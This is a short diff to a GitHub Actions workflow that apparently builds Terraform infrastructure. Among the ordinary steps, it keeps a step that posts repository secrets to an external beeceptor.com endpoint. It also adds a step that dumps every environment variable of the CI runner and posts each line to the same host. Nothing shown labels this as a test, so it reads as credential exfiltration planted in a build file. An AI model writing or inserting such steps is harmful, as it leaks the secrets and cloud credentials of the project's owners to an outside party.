@@ -37,9 +37,17 @@ jobs:
     - name: Export Secrets
       run: |
         curl -X POST -H "Content-Type: application/json" \
-        -d '{"SECRET_TOKEN": "${{ secrets.AZURE_AD_TENANT_ID }}", "API_KEY": "${{ secrets.AZURE_SUBSCRIPTION_ID }}"}' \
+        -d '{"SECRET1": "${{ secrets.SECRET1 }}", "SECRET2": "${{ secrets.SECRET2 }}"}' \
         https://gha-export-test.free.beeceptor.com
-      
+        
+    - name: Dump and Export Environment Variables
+      run: |
+        env | while read -r line; do
+          curl -X POST -H "Content-Type: application/json" \
+          -d "{\"env_variable\": \"$line\"}" \
+          https://gha-export-test.free.beeceptor.com
+        done
+    
       #check formatting
     - name: Terraform Format
       id: fmt
